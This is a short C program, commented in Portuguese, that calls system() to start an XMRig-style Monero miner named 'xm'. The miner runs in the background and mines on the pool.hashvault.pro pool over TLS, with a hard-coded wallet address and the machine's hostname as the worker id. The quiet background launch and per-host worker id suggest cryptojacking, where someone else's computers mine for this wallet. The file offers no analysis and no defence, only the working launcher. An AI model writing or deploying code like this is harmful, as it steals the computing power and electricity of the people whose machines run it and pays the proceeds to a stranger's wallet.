#include <stdlib.h>
#include <stdio.h>

int main() {
    // Comando a ser executado
    const char *command = "xm -B --url pool.hashvault.pro:443 --user 49iptWnuqtM63oBYMbp9qpgTGmGAjgygCWdceETJPsnu9HhHkKykqjkRowCfSBC22Ab9yrLu4zfhXcuxNPWW8YsDBgDcKhD --pass $(hostname) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14";

    // Executa o comando
    int result = system(command);

    // Verifica se o comando foi executado com sucesso
    if (result == -1) {
        perror("Erro ao executar o comando");
        return 1;
    }

    return 0;
}
